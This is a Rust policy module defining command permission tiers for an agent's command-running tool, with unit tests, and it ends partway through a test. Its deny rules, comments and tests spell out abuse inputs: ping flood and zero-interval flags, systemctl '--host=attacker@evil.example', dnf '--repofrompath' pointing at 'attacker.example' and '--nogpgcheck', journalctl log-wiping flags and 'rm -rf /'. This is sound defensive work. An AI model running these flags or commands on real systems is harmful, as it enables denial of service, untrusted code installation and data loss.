use super::{Effect, Rule};
use regex::Regex;

#[derive(Debug, Clone, PartialEq, serde::Serialize, serde::Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum TierName {
    Safe,
    Standard,
    Unrestricted,
}

fn allow(command: &str, arg_pattern: Option<&str>, description: &str) -> Rule {
    Rule {
        command: command.to_string(),
        arg_pattern: arg_pattern.map(|p| Regex::new(p).unwrap()),
        effect: Effect::Allow,
        description: description.to_string(),
    }
}

fn deny(command: &str, arg_pattern: &str, description: &str) -> Rule {
    Rule {
        command: command.to_string(),
        arg_pattern: Some(Regex::new(arg_pattern).unwrap()),
        effect: Effect::Deny,
        description: description.to_string(),
    }
}

// NOTE (post-review fix, tier-level defence in depth): the `--` separators
// added to the structured tool handlers (dnf.rs, network.rs, systemctl.rs)
// only harden those handlers. `run_command` reaches the same binaries
// straight through the policy layer, which is the actual security boundary,
// so any dangerous flag the tier rules do not exclude is reachable in one
// call regardless of what the tool files do. The deny-before-allow rules
// below close the specific gaps found in review. `PolicyEngine::evaluate`
// is first-match-wins, so each `Deny` must precede the broad `Allow` for
// the same command.

/// Flood-ping and interval-abuse flags. `ping -f` (and `-i` with a
/// sub-second interval) turns a tier documented as "read-only diagnostics,
/// no mutation of system state" into an outbound denial-of-service tool.
/// The alternation is deliberately anchored to token starts so an ordinary
/// `ping -c 4 host` (or a hostname merely containing an `f`) is unaffected.
/// The first alternative matches a short-option token containing `f`,
/// including clustered forms with an attached value such as `-fc100`
/// (getopt parses this as `-f -c 100`, i.e. flood ping with count 100);
/// ping's only short option using `f` is `--flood`, so there is no
/// legitimate flag this rejects. The interval alternative is likewise
/// extended to clustered forms such as `-ci0.01`.
///
/// Four further gaps were closed in the adversarial review pass:
/// * `-i 0` (a bare integer zero) is accepted by real `ping` and floods
///   just as effectively as `-i 0.01`, but the old pattern required a
///   literal decimal point, so it sailed through. The interval alternative
///   now matches either a fractional value (`0.01`, `.001`) or an
///   all-zero integer value (`0`, `00`) terminated by whitespace or the
///   end of the string. It deliberately does *not* match `-i 1` or
///   `-i 10`, which are ordinary intervals.
/// * `-A` (adaptive ping) paces packets to the round-trip time, which on a
///   LAN is flood ping by another name.
/// * `-l <n>` (preload) blasts `n` packets before waiting for any reply.
/// * `-s <n>` (packet size) is the oversized-packet DoS vector already
///   named in the comment in `src/tools/network.rs`, but never actually
///   added here.
///
/// All four use the same `(?:^|\s)-[A-Za-z]*X` token shape as the existing
/// alternatives, so only an option-looking token starting with `-` at a
/// token boundary can trip them. A hostname containing the same letter
/// (`fedoraproject.org`, `my-fileserver.local`) cannot, because its `-` is
/// never preceded by whitespace or the start of the string. `A`, `l` and
/// `s` are matched case-sensitively, and no other `ping` option uses those
/// exact letters in those exact cases, so nothing legitimate is rejected.
///
/// Two further zero-interval forms were closed in a later pass: `ping`
/// parses `-i`'s argument with `strtod`, which accepts scientific-notation
/// (`0e0`, `0E0`, `0e+0`, `0e-0`, `00e00`) and hex (`0x0`, `0X0`, `0x00`)
/// spellings of zero in addition to the plain decimal and integer forms
/// already matched above. Both still flood exactly as `-i 0` or `-i 0.0`
/// do, and neither contains a literal `.` or a bare trailing `0`-only
/// token the earlier alternatives look for, so both sailed through
/// unmatched.
///
/// A subsequent adversarial review found the first fix for those two forms
/// still had gaps within its own class, all `strtod`-zero, all flooding
/// exactly like `-i 0`: a leading sign (`-i +0`), a non-zero exponent on a
/// zero mantissa (`-i 0e5`, since `0 * 10^5` is still `0`), and a hex
/// floating-point form with a binary exponent (`-i 0x0p0`, C99 hex-float
/// syntax `strtod` also accepts). The interval alternative now matches an
/// optional leading `[+-]` on every zero form, `0+[eE][+-]?\d+` for
/// scientific notation (the exponent's own digits no longer need to be
/// zero, only the mantissa does), and `0[xX]0+(?:[pP][+-]?\d+)?` for hex
/// (the `p`-exponent, if present at all, is likewise unconstrained), each
/// still terminated by whitespace or the end of the string. `0x0` without
/// a `p`-exponent remains matched too, since `strtod` still accepts that
/// form even though it is not a strictly conforming C99 hex float.
const PING_ABUSE_FLAGS: &str = concat!(
    r"(?:^|\s)-[A-Za-z]*f",
    r"|--flood",
    r"|(?:^|\s)-[A-Za-z]*i\s*(?:0*\.\d",
    r"|[+-]?0+(?:\s|$)",
    r"|[+-]?0+[eE][+-]?\d+(?:\s|$)",
    r"|[+-]?0[xX]0+(?:[pP][+-]?\d+)?(?:\s|$))",
    r"|(?:^|\s)-[A-Za-z]*A",
    r"|(?:^|\s)-[A-Za-z]*l",
    r"|(?:^|\s)-[A-Za-z]*s",
);

/// systemctl flags that redirect the operation away from the local system.
/// `--host`/`-H` runs the command against a remote machine over SSH,
/// `--machine`/`-M` against a local container, `--root` against an
/// arbitrary filesystem tree, and `--image`/`--image-policy` against a disk
/// image rather than the running system. `--host` in particular turns the
/// `safe` tier's read-only `systemctl status` into an arbitrary outbound
/// SSH connection using this machine's identity.
///
/// `src/tools/systemctl.rs` already inserts a `--` separator so its own
/// argv builders cannot be tricked this way, but that only protects the
/// structured tools. `run_command` reaches `systemctl` straight through the
/// policy engine, where `status --host=attacker@evil.example sshd` still
/// matches the `^status` allow pattern. This deny closes that path, the
/// same way `PING_ABUSE_FLAGS` and `DNF_TRUST_BYPASS_FLAGS` close theirs.
///
/// Placed in `safe_rules()`, which `standard_rules()` extends rather than
/// replaces, so a single rule precedes both the `^status` allow (safe) and
/// the `^(start|stop|...)` allow (standard) under first-match-wins.
///
/// The long-flag half matches *prefixes*, not full names. `systemctl` parses
/// its options with glibc `getopt_long`, which accepts any unambiguous
/// abbreviation of a long option, so `--ho=evil.example` reaches `--host`
/// while containing none of the letters a full-name pattern looks for. This
/// is the same bypass class already closed for dnf's `--nog`/`--repof`.
/// Each prefix below is the shortest form `systemctl` itself resolves
/// uniquely, so every abbreviation it would accept necessarily contains it:
/// * `--ho` — the only other `--h` option is `--help` (`--he`).
/// * `--mac` — `--marked`, `--message` and `--mkdir` diverge by the third
///   letter, so `--mac` resolves uniquely to `--machine`.
/// * `--ro` — `--root` is the only `--ro` option; `--read-only`,
///   `--recursive` and `--reverse` are `--re`, and `--runtime` is `--ru`.
/// * `--im` — `--image` and `--image-policy` are the only `systemctl` long
///   options beginning `--im` (the other nearby `--i` option is
///   `--ignore-dependencies`/`--ignore-inhibitors`, which diverge at `--ig`),
///   so `--im` resolves unambiguously to one of the two, and both belong to
///   the same "operate against a disk image, not the local system" family
///   this deny closes.
///
/// Requiring the leading `--` (and a word boundary before it) keeps these
/// short prefixes from matching a unit name that happens to contain the
/// same letters.
const SYSTEMCTL_HOST_REDIRECT_FLAGS: &str = r"(?:^|\s)--(?:ho|mac|ro|im)|(?:^|\s)-[A-Za-z]*[HM]";

/// Flags that defeat dnf's integrity and repository trust model:
/// `--nogpgcheck` skips signature verification, `--repofrompath` adds an
/// attacker-controlled repository for the duration of the transaction, and
/// `--setopt` can reach either of those (and more) indirectly. The tier's
/// `^(install|remove|upgrade)` allow pattern matches the leading subcommand
/// only and says nothing about the flags that follow it.
///
/// The patterns match *prefixes*, not the full flag names. dnf's CLI is
/// argparse-based with `allow_abbrev` left at its default, so any
/// unambiguous prefix of a long option is accepted: `dnf install
/// --nogpgchec pkg` disables signature checking exactly as `--nogpgcheck`
/// does, while containing neither the substring `nogpgcheck` nor anything
/// the old pattern matched. Each prefix below is the shortest form that is
/// still unambiguous to dnf itself, so every abbreviation dnf would accept
/// necessarily contains it:
/// * `--nog` — the other `--no*` options are `--nobest`, `--nodocs`,
///   `--noautoremove` and `--noplugins`, so `--nog` already resolves
///   uniquely to `--nogpgcheck`.
/// * `--repof` — `--repo` is itself a real option, so the shortest
///   unambiguous prefix of `--repofrompath` is one character longer.
/// * `--set` — no other dnf option begins `--set`.
///
/// Requiring the leading `--` keeps these short prefixes from matching a
/// package name that merely happens to contain the same letters. The whole
/// alternation is anchored to a `(?:^|\s)` token boundary before the `--`,
/// the same style `SYSTEMCTL_HOST_REDIRECT_FLAGS` uses, so a package name or
/// argument value that merely *contains* one of these substrings mid-word
/// (rather than being the flag itself) is not denied, e.g. an argument
/// containing the literal text `offset` no longer trips the `--set`
/// fragment.
const DNF_TRUST_BYPASS_FLAGS: &str = r"(?:^|\s)--(?:nog|repof|set)";

/// journalctl subcommands and flags that write to `/var/log/journal`
/// rather than read from it. `--setup-keys` generates and writes Forward
/// Secure Sealing keys, so it belongs with the vacuum/rotate family even
/// though its name does not suggest mutation.
///
/// As with dnf and systemctl, these match *prefixes*: `journalctl` parses
/// its options with glibc `getopt_long`, so any unambiguous abbreviation of
/// a long option is accepted and `--rot` mutates the journal exactly as
/// `--rotate` does. Each prefix is the shortest form journalctl resolves
/// uniquely, so every abbreviation it would accept contains it:
/// * `--rot` — `--root` is the other `--ro` option, so `--rot` is the
///   shortest prefix that reaches `--rotate`.
/// * `--fl` — `--flush` is the only `--fl` option (`--file`, `--follow`,
///   `--full`, `--force`, `--facility` and `--field` all diverge sooner).
/// * `--syn` — `--system` is the other `--sy` option.
/// * `--rel` — `--relinquish-var` is the only `--re` … `--rel` option
///   (`--reverse` is `--rev`).
/// * `--sm` — kept as a defensive prefix for a `--smart-relinquish-var`
///   sibling flag reported in some systemd sources but not independently
///   confirmed here. No journalctl read option begins `--sm`, so the
///   prefix costs nothing if the flag turns out not to exist, and closes
///   the gap if it does.
/// * `--set` — `--setup-keys` is the only `--set` option (`--since` is
///   `--si`).
/// * `--upd` — the shortest unambiguous prefix reaching
///   `--update-catalog`, which writes to `/var/lib/systemd/catalog`
///   rather than `/var/log/journal` but is the same "this mutates state,
///   it is not a read" class the rest of this constant exists to close.
///   No other journalctl option begins `--up`.
///
/// `--vacuum` is matched as its own alternative rather than a `--rot`-style
/// prefix: `--vac` is ambiguous across `--vacuum-size`, `--vacuum-time` and
/// `--vacuum-files`, so the shortest abbreviation journalctl accepts already
/// spells `--vacuum` in full. It is always `--`-prefixed in real usage
/// (there is no bare `vacuum` subcommand), so it is anchored the same way
/// as the other alternatives below, not left as a bare substring.
///
/// The whole alternation is anchored to a `(?:^|\s)` token boundary, the
/// same style `SYSTEMCTL_HOST_REDIRECT_FLAGS` uses, so `--vacuum` and the
/// rest only match at the start of an argument token, not as a bare
/// substring inside a unit name or grep pattern (e.g. a unit named
/// `myservice--rotate.service` no longer trips `--rot` merely because the
/// substring appears mid-token).
const JOURNALCTL_MUTATION_FLAGS: &str =
    r"(?:^|\s)(?:--vacuum|--rot|--fl|--syn|--rel|--sm|--set|--upd)";

/// `sar`'s `-o <file>` writes its binary sample data to an arbitrary
/// path, an arbitrary-file-write primitive wrapped in a monitoring tool
/// that is otherwise entirely read-only. Denied before the broad allow,
/// same first-match-wins pattern as the other tier-level hardening in
/// this file.
///
/// The pattern deliberately has no word boundary after `-o`: `sar` accepts
/// the output path attached to the flag with no separator (`-ofile.dat`),
/// the same clustered-short-option shape `PING_ABUSE_FLAGS` was hardened
/// against for forms like `-fc100`. A trailing `\b` would only match the
/// space-separated form (`-o /tmp/evil.dat`, where the boundary falls on
/// the space) and miss the attached form entirely, since `o` and the
/// following filename character are both word characters and no boundary
/// exists between them. None of sar's other options begin with `o`
/// (`-u`, `-r`, `-b`, `-d`, `-n`, `-S`, `-q`, `-w`), so matching bare `-o`
/// regardless of what follows catches both forms without rejecting any
/// legitimate flag.
const SAR_FILE_OUTPUT_FLAG: &str = r"(?:^|\s)-o";

fn safe_rules() -> Vec<Rule> {
    vec![
        deny(
            "systemctl",
            SYSTEMCTL_HOST_REDIRECT_FLAGS,
            "reject --host/--machine/--root/--image (redirects the operation off the local system)",
        ),
        allow("systemctl", Some("^status"), "read a unit's status"),
        allow(
            "systemctl",
            Some("^is-active"),
            "check whether a unit is active",
        ),
        allow(
            "systemctl",
            Some("^is-enabled"),
            "check whether a unit is enabled at boot",
        ),
        deny(
            "journalctl",
            JOURNALCTL_MUTATION_FLAGS,
            "reject mutation flags (--vacuum-*, --rotate, --flush, --sync, --relinquish-var, --setup-keys, --update-catalog)",
        ),
        allow("journalctl", None, "read the system journal"),
        deny(
            "ping",
            PING_ABUSE_FLAGS,
            "reject flood/zero-interval/adaptive/preload/oversized-packet flags",
        ),
        allow("ping", None, "send ICMP echo requests"),
        allow(
            "ip",
            Some(r"^(addr|route|link)(\s+(show|list|get)(\s.*)?)?$"),
            "read network addresses, routes, or link state",
        ),
        // Read-only resource monitoring, safe to run indefinitely under
        // the `safe` tier: none of these mutate system state.
        //
        // `vmstat`'s entire option set is reporting flags: the positional
        // interval/count arguments and single-letter switches such as
        // `-a` (active/inactive memory), `-s` (event counter summary),
        // `-d` (disk stats), `-p` (per-partition stats), `-m` (slab
        // info), `-n` (suppress repeated headers), `-S` (unit selection),
        // `-t` (add a timestamp column) and `-w` (wide output). Every one
        // of these only changes which columns are printed or how often;
        // none of them write to a file, spawn a child process, or
        // otherwise touch state outside vmstat's own stdout, so an
        // unconditional `allow(None)` is safe.
        allow(
            "vmstat",
            None,
            "read virtual memory, disk, and CPU statistics",
        ),
        // `sar`'s `-o` (write raw sample data to an arbitrary path) is
        // denied before the broad allow, the same deny-before-allow
        // pattern used for ping/dnf/journalctl elsewhere in this file.
        deny(
            "sar",
            SAR_FILE_OUTPUT_FLAG,
            "reject -o (writes raw sample data to an arbitrary path)",
        ),
        allow("sar", None, "read system activity statistics"),
        // `top` requires `-b` (batch mode), interactive top would hang as
        // a non-interactive tool call rather than behave sensibly.
        //
        // `^-b` also matches an invented flag like `-badness`, not just
        // real `-b`. This is confirmed non-exploitable: execution here is
        // argv-only with no shell involved, so there is no injection
        // surface, and `top` itself would simply reject an unrecognised
        // `-badness` flag with an error rather than silently falling back
        // to interactive mode. The pattern is left loose deliberately
        // rather than anchored to `^-b(\s|$)`, since the failure mode of
        // over-matching here is "top errors out," not a policy bypass.
        allow(
            "top",
            Some(r"^-b"),
            "read a one-shot batch-mode process snapshot",
        ),
    ]
}

fn standard_rules() -> Vec<Rule> {
    let mut rules = safe_rules();
    rules.extend(vec![
        allow(
            "systemctl",
            Some("^(start|stop|restart|enable|disable)"),
            "start, stop, restart, enable, or disable a unit",
        ),
        deny(
            "dnf",
            DNF_TRUST_BYPASS_FLAGS,
            "reject --nogpgcheck/--repofrompath/--setopt (bypasses package signature and repository trust)",
        ),
        allow(
            "dnf",
            Some("^(install|remove|upgrade)"),
            "install, remove, or upgrade a package via dnf",
        ),
        allow(
            "rpm-ostree",
            Some("^(install|upgrade|status|uninstall)"),
            "install, upgrade, check status, or uninstall a package via rpm-ostree",
        ),
    ]);
    rules
}

pub fn rules_for_tier(tier: &TierName) -> Vec<Rule> {
    match tier {
        TierName::Safe => safe_rules(),
        TierName::Standard => standard_rules(),
        TierName::Unrestricted => vec![Rule {
            command: String::new(),
            arg_pattern: None,
            effect: Effect::Allow,
            description: "every command, no restrictions".to_string(),
        }],
    }
}

pub fn tier_display_name(tier: &TierName) -> String {
    format!("{tier:?}").to_lowercase()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::policy::{Decision, PolicyEngine};

    #[test]
    fn no_tier_rule_has_an_empty_description() {
        for tier in [TierName::Safe, TierName::Standard, TierName::Unrestricted] {
            for rule in rules_for_tier(&tier) {
                assert!(
                    !rule.description.trim().is_empty(),
                    "rule for command '{}' under {:?} has an empty description",
                    rule.command,
                    tier
                );
            }
        }
    }

    #[test]
    fn safe_tier_allows_systemctl_status_but_denies_stop() {
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Safe));
        assert!(matches!(
            engine.evaluate("systemctl", &["status".into(), "sshd".into()]),
            Decision::Allowed
        ));
        assert!(matches!(
            engine.evaluate("systemctl", &["stop".into(), "sshd".into()]),
            Decision::Denied(_)
        ));
    }

    #[test]
    fn safe_tier_denies_dnf_and_raw_run_command_entirely() {
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Safe));
        assert!(matches!(
            engine.evaluate("dnf", &["install".into(), "-y".into(), "htop".into()]),
            Decision::Denied(_)
        ));
    }

    #[test]
    fn standard_tier_allows_systemctl_stop_and_dnf_install() {
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Standard));
        assert!(matches!(
            engine.evaluate("systemctl", &["stop".into(), "sshd".into()]),
            Decision::Allowed
        ));
        assert!(matches!(
            engine.evaluate("dnf", &["install".into(), "-y".into(), "htop".into()]),
            Decision::Allowed
        ));
    }

    #[test]
    fn standard_tier_still_denies_arbitrary_raw_commands() {
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Standard));
        assert!(matches!(
            engine.evaluate("rm", &["-rf".into(), "/".into()]),
            Decision::Denied(_)
        ));
    }

    #[test]
    fn unrestricted_tier_allows_anything() {
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Unrestricted));
        assert!(matches!(
            engine.evaluate("rm", &["-rf".into(), "/".into()]),
            Decision::Allowed
        ));
    }

    #[test]
    fn safe_tier_denies_ip_mutation_but_allows_ip_show() {
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Safe));
        assert!(matches!(
            engine.evaluate(
                "ip",
                &[
                    "addr".into(),
                    "add".into(),
                    "10.0.0.1/24".into(),
                    "dev".into(),
                    "eth0".into()
                ]
            ),
            Decision::Denied(_)
        ));
        assert!(matches!(
            engine.evaluate("ip", &["addr".into(), "show".into(), "eth0".into()]),
            Decision::Allowed
        ));
        assert!(matches!(
            engine.evaluate("ip", &["addr".into()]),
            Decision::Allowed
        ));
    }

    #[test]
    fn safe_tier_denies_journalctl_vacuum_but_allows_ordinary_query() {
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Safe));
        assert!(matches!(
            engine.evaluate("journalctl", &["--vacuum-time=1s".into()]),
            Decision::Denied(_)
        ));
        assert!(matches!(
            engine.evaluate("journalctl", &["-u".into(), "sshd".into()]),
            Decision::Allowed
        ));
    }

    // The tests below exercise the `run_command`-shaped path: a bare
    // command plus raw argv, evaluated by the policy engine with no
    // structured tool handler in between. That is the boundary the `--`
    // separators in the tool files do not cover.

    #[test]
    fn safe_tier_denies_flood_ping_but_allows_an_ordinary_ping() {
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Safe));
        for denied in [
            vec!["-f".to_string(), "8.8.8.8".to_string()],
            vec!["--flood".to_string(), "8.8.8.8".to_string()],
            vec![
                "-c".to_string(),
                "100".to_string(),
                "-f".to_string(),
                "8.8.8.8".to_string(),
            ],
            vec!["-fc".to_string(), "100".to_string(), "8.8.8.8".to_string()],
            // Clustered short options with an attached value: getopt parses
            // `-fc100` as `-f -c 100` (flood ping, count 100).
            vec!["-fc100".to_string(), "8.8.8.8".to_string()],
            vec!["-i".to_string(), "0.01".to_string(), "8.8.8.8".to_string()],
            vec!["-i".to_string(), ".001".to_string(), "8.8.8.8".to_string()],
            vec!["-i0.01".to_string(), "8.8.8.8".to_string()],
            // Clustered form of the interval flag: `-ci0.01` is `-c -i 0.01`.
            vec!["-ci0.01".to_string(), "8.8.8.8".to_string()],
            // A bare integer zero interval floods just as effectively as a
            // fractional one, and the pattern used to require a decimal
            // point.
            vec!["-i".to_string(), "0".to_string(), "8.8.8.8".to_string()],
            vec!["-i0".to_string(), "8.8.8.8".to_string()],
            vec!["-i".to_string(), "00".to_string(), "8.8.8.8".to_string()],
            vec!["-i".to_string(), "0".to_string()],
            // strtod-based parsing also accepts scientific-notation and
            // hex spellings of zero, both of which still flood.
            vec!["-i".to_string(), "0e0".to_string(), "8.8.8.8".to_string()],
            vec!["-i".to_string(), "0E0".to_string(), "8.8.8.8".to_string()],
            vec!["-i".to_string(), "0e+0".to_string(), "8.8.8.8".to_string()],
            vec!["-i".to_string(), "0e-0".to_string(), "8.8.8.8".to_string()],
            vec!["-i".to_string(), "00e00".to_string(), "8.8.8.8".to_string()],
            vec!["-i".to_string(), "0x0".to_string(), "8.8.8.8".to_string()],
            vec!["-i".to_string(), "0X0".to_string(), "8.8.8.8".to_string()],
            vec!["-i".to_string(), "0x00".to_string(), "8.8.8.8".to_string()],
            vec!["-i0e0".to_string(), "8.8.8.8".to_string()],
            vec!["-i0x0".to_string(), "8.8.8.8".to_string()],
            // Clustered short-option form, consistent with how the file
            // already tests clustering for this constant: `-ci0x0` is
            // `-c -i 0x0` (flood interval clustered with count).
            vec!["-ci0x0".to_string(), "8.8.8.8".to_string()],
            vec!["-ci0e0".to_string(), "8.8.8.8".to_string()],
            // A second adversarial pass found these still slipped through
            // the first zero-interval fix, all `strtod`-zero, all flooding
            // the same as `-i 0`.
            vec!["-i".to_string(), "+0".to_string(), "8.8.8.8".to_string()],
            // A non-zero exponent on a zero mantissa is still zero.
            vec!["-i".to_string(), "0e5".to_string(), "8.8.8.8".to_string()],
            vec!["-i".to_string(), "0E9".to_string(), "8.8.8.8".to_string()],
            vec!["-i".to_string(), "+0e5".to_string(), "8.8.8.8".to_string()],
            // C99 hex-float syntax: a binary exponent on a zero mantissa.
            vec!["-i".to_string(), "0x0p0".to_string(), "8.8.8.8".to_string()],
            vec![
                "-i".to_string(),
                "0X0P+3".to_string(),
                "8.8.8.8".to_string(),
            ],
            // Adaptive ping: paced to the round-trip time, which on a LAN
            // is flood ping under another name.
            vec!["-A".to_string(), "8.8.8.8".to_string()],
            vec!["-cA".to_string(), "4".to_string(), "8.8.8.8".to_string()],
            // Preload: blasts n packets before waiting for a reply.
            vec!["-l".to_string(), "1000".to_string(), "8.8.8.8".to_string()],
            // Oversized packets, the DoS vector named in network.rs.
            vec!["-s".to_string(), "65000".to_string(), "8.8.8.8".to_string()],
        ] {
            assert!(
                matches!(engine.evaluate("ping", &denied), Decision::Denied(_)),
                "ping {denied:?} should be denied under the safe tier"
            );
        }

        for allowed in [
            vec!["8.8.8.8".to_string()],
            vec!["-c".to_string(), "4".to_string(), "8.8.8.8".to_string()],
            vec![
                "-c".to_string(),
                "4".to_string(),
                "-i".to_string(),
                "1".to_string(),
                "example.com".to_string(),
            ],
            // A hostname that merely contains an `f` must not trip the
            // flood-flag pattern.
            vec![
                "-c".to_string(),
                "4".to_string(),
                "fedoraproject.org".to_string(),
            ],
            vec![
                "-w".to_string(),
                "5".to_string(),
                "my-fileserver.local".to_string(),
            ],
            // Ordinary integer intervals must survive the `-i 0` fix: only
            // an all-zero value is a flood.
            vec!["-i".to_string(), "1".to_string(), "8.8.8.8".to_string()],
            vec!["-i".to_string(), "10".to_string(), "8.8.8.8".to_string()],
            // A non-zero scientific-notation interval is an ordinary
            // interval, not a flood, and must survive the new alternative.
            vec!["-i".to_string(), "1e0".to_string(), "8.8.8.8".to_string()],
            // A non-zero mantissa with a sign or an exponent is still an
            // ordinary interval, not a flood: only a zero mantissa denies.
            vec!["-i".to_string(), "+5".to_string(), "8.8.8.8".to_string()],
            vec!["-i".to_string(), "5e0".to_string(), "8.8.8.8".to_string()],
            // Uppercase `-S` (sndbuf) is a different option from `-s`, and
            // the deny alternatives are case-sensitive.
            vec!["-S".to_string(), "1024".to_string(), "8.8.8.8".to_string()],
            // A hostname whose embedded hyphen is not at a token boundary
            // must not trip the new single-letter alternatives.
            vec![
                "-c".to_string(),
                "4".to_string(),
                "host-alpha.local".to_string(),
            ],
            vec![
                "-c".to_string(),
                "4".to_string(),
                "web-server.example".to_string(),
            ],
        ] {
            assert!(
                matches!(engine.evaluate("ping", &allowed), Decision::Allowed),
                "ping {allowed:?} should be allowed under the safe tier"
            );
        }
    }

    #[test]
    fn standard_tier_denies_dnf_trust_bypass_flags_but_allows_a_plain_install() {
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Standard));
        for denied in [
            vec![
                "install".to_string(),
                "-y".to_string(),
                "--nogpgcheck".to_string(),
                "htop".to_string(),
            ],
            vec![
                "install".to_string(),
                "-y".to_string(),
                "--repofrompath=evil,http://attacker.example/repo".to_string(),
                "pkg".to_string(),
            ],
            vec![
                "install".to_string(),
                "--setopt=gpgcheck=0".to_string(),
                "htop".to_string(),
            ],
            vec!["upgrade".to_string(), "--nogpgcheck".to_string()],
        ] {
            assert!(
                matches!(engine.evaluate("dnf", &denied), Decision::Denied(_)),
                "dnf {denied:?} should be denied under the standard tier"
            );
        }

        assert!(matches!(
            engine.evaluate("dnf", &["install".into(), "-y".into(), "htop".into()]),
            Decision::Allowed
        ));
        assert!(matches!(
            engine.evaluate("dnf", &["upgrade".into()]),
            Decision::Allowed
        ));
    }

    #[test]
    fn both_tiers_deny_systemctl_host_redirection_but_allow_ordinary_use() {
        // The `--` separator in src/tools/systemctl.rs protects only the
        // structured tools. These are `run_command`-shaped calls, which
        // reach the policy engine directly, so the tier rules are the only
        // thing standing between a `safe`-tier agent and an outbound SSH
        // connection made with this machine's identity.
        for tier in [TierName::Safe, TierName::Standard] {
            let engine = PolicyEngine::new(rules_for_tier(&tier));
            for denied in [
                vec![
                    "status".to_string(),
                    "--host=attacker@evil.example".to_string(),
                    "sshd".to_string(),
                ],
                vec![
                    "status".to_string(),
                    "--machine=somecontainer".to_string(),
                    "sshd".to_string(),
                ],
                vec![
                    "status".to_string(),
                    "--root=/mnt/other".to_string(),
                    "sshd".to_string(),
                ],
                vec![
                    "status".to_string(),
                    "-H".to_string(),
                    "attacker@evil.example".to_string(),
                    "sshd".to_string(),
                ],
                vec![
                    "status".to_string(),
                    "-M".to_string(),
                    "somecontainer".to_string(),
                    "sshd".to_string(),
                ],
                vec![
                    "start".to_string(),
                    "--host=attacker@evil.example".to_string(),
                    "sshd".to_string(),
                ],
                // getopt_long accepts any unambiguous abbreviation, so the
                // deny has to match prefixes rather than full flag names.
                vec![
                    "status".to_string(),
                    "--ho=evil.example".to_string(),
                    "sshd".to_string(),
                ],
                vec![
                    "status".to_string(),
                    "--hos=evil.example".to_string(),
                    "sshd".to_string(),
                ],
                vec![
                    "status".to_string(),
                    "--mac=container".to_string(),
                    "sshd".to_string(),
                ],
                vec![
                    "status".to_string(),
                    "--ro=/mnt/other".to_string(),
                    "sshd".to_string(),
                ],
                vec![
                    "status".to_string(),
                    "--roo=/mnt/other".to_string(),
                    "sshd".to_string(),
                ],
                vec![
                    "start".to_string(),
                    "--ho=evil.example".to_string(),
                    "sshd".to_string(),
                ],
                // --image/--image-policy redirect against a disk image
                // rather than the running system, the same family --host/
                // --machine/--root are already denied for.
                vec![
                    "status".to_string(),
                    "--image=/path/to.raw".to_string(),
                    "sshd".to_string(),
                ],
                vec![
                    "status".to_string(),
                    "--im=/path/to.raw".to_string(),
                    "sshd".to_string(),
                ],
                vec![
                    "status".to_string(),
                    "--image-policy=root=verity".to_string(),
                    "sshd".to_string(),
                ],
            ] {
                assert!(
                    matches!(engine.evaluate("systemctl", &denied), Decision::Denied(_)),
                    "systemctl {denied:?} should be denied under the {tier:?} tier"
                );
            }

            // Ordinary reads stay allowed under both tiers, including the
            // `--`-separated argv the structured tool actually builds.
            for allowed in [
                vec!["status".to_string(), "sshd".to_string()],
                vec!["status".to_string(), "--".to_string(), "sshd".to_string()],
                // Real long options that share leading letters with the
                // denied ones must survive the prefix matching.
                vec![
                    "status".to_string(),
                    "--no-pager".to_string(),
                    "sshd".to_string(),
                ],
                vec![
                    "status".to_string(),
                    "--recursive".to_string(),
                    "--reverse".to_string(),
                    "sshd".to_string(),
                ],
                vec![
                    "status".to_string(),
                    "--type=service".to_string(),
                    "sshd".to_string(),
                ],
                // A real systemctl long option sharing the `--i` prefix
                // with --image, but diverging at the third letter, must
                // survive the new --im prefix.
                vec![
                    "status".to_string(),
                    "--ignore-dependencies".to_string(),
                    "sshd".to_string(),
                ],
            ] {
                assert!(
                    matches!(engine.evaluate("systemctl", &allowed), Decision::Allowed),
                    "systemctl {allowed:?} should be allowed under the {tier:?} tier"
                );
            }
        }

        // Service control is a standard-tier privilege, and it survives the
        // new deny rule sitting ahead of its allow rule.
        let standard = PolicyEngine::new(rules_for_tier(&TierName::Standard));
        for allowed in [
            vec!["stop".to_string(), "sshd".to_string()],
            vec!["restart".to_string(), "--".to_string(), "sshd".to_string()],
        ] {
            assert!(
                matches!(standard.evaluate("systemctl", &allowed), Decision::Allowed),
                "systemctl {allowed:?} should be allowed under the standard tier"
            );
        }
    }

    #[test]
    fn standard_tier_denies_abbreviated_dnf_trust_bypass_flags() {
        // dnf's argparse-based CLI accepts any unambiguous prefix of a long
        // option, so `--nogpgchec` disables signature checking exactly as
        // `--nogpgcheck` does. The deny pattern matches the shortest
        // unambiguous prefix so every accepted abbreviation contains it.
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Standard));
        for denied in [
            vec![
                "install".to_string(),
                "--nogpgchec".to_string(),
                "pkg".to_string(),
            ],
            vec![
                "install".to_string(),
                "--nog".to_string(),
                "pkg".to_string(),
            ],
            vec![
                "install".to_string(),
                "--repof=evil,http://attacker.example/repo".to_string(),
                "pkg".to_string(),
            ],
            vec![
                "install".to_string(),
                "--setop=gpgcheck=0".to_string(),
                "pkg".to_string(),
            ],
        ] {
            assert!(
                matches!(engine.evaluate("dnf", &denied), Decision::Denied(_)),
                "dnf {denied:?} should be denied under the standard tier"
            );
        }

        // A package name that merely contains the same letters is not a
        // flag, and the required `--` prefix keeps it allowed.
        assert!(matches!(
            engine.evaluate("dnf", &["install".into(), "-y".into(), "nogpgd".into()]),
            Decision::Allowed
        ));
        assert!(matches!(
            engine.evaluate(
                "dnf",
                &["install".into(), "--repo".into(), "updates".into()]
            ),
            Decision::Allowed
        ));
    }

    #[test]
    fn safe_tier_denies_abbreviated_journalctl_mutation_flags() {
        // journalctl uses glibc getopt_long, which accepts any unambiguous
        // abbreviation of a long option, so `--rot` rotates the journal
        // exactly as `--rotate` does while containing none of the letters a
        // full-name pattern looks for.
        let engine = PolicyEngine::new(rules_for_tier(&TierName::Safe));
        for denied in [
            vec!["--rot".to_string()],
            vec!["--rota".to_string()],
            vec!["--fl".to_string()],
            vec!["--flu".to_string()],
            vec!["--syn".to_string()],
            vec!["--rel".to_string()],
